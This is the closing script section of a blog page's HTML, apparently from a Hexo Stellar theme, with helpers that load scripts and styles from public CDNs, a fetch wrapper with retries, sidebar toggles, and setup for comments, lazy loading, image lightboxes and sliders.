        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
